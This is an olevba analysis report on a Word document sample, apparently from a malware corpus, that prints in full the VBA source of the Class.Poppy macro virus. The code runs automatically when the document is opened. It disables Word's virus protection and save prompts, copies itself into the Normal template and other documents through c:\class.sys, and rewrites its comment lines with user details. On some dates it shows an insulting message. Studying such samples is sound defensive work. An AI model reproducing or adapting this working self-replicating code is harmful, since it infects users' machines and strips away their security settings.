olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.db
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Class.db 
in file: ./Virus.MSWord.Class.db - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub AutoOpen()
'todorovs20.10.00 15:55:21HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
On Error GoTo out
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
Options.VirusProtection = False
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
Options.SaveNormalPrompt = False
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
Options.ConfirmConversions = False
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
If nt > 70 And ad > 0 Then GoTo out
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
If nt < 70 Then
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
End If
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
host.codemodule.AddFromFile ("c:\class.sys")
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
With host.codemodule
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    For x = 1 To 4
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    .deletelines 1
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    Next x
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
End With
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
If nt < 70 Then
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    With host.codemodule
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    .replaceline 1, "Sub AutoClose()"
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    .replaceline 71, "Sub ToolsMacro()"
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    End With
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
End If
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
With host.codemodule
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    For x = 2 To 72 Step 2
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
    Next x
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
End With
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
out:
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
End Sub
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
Sub ViewVBCode()
'todorovs20.10.00 15:55:22HP LaserJet Series I (Kopie 2) on LPT1:Maxillofacial Trauma due to workOffice Logo
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

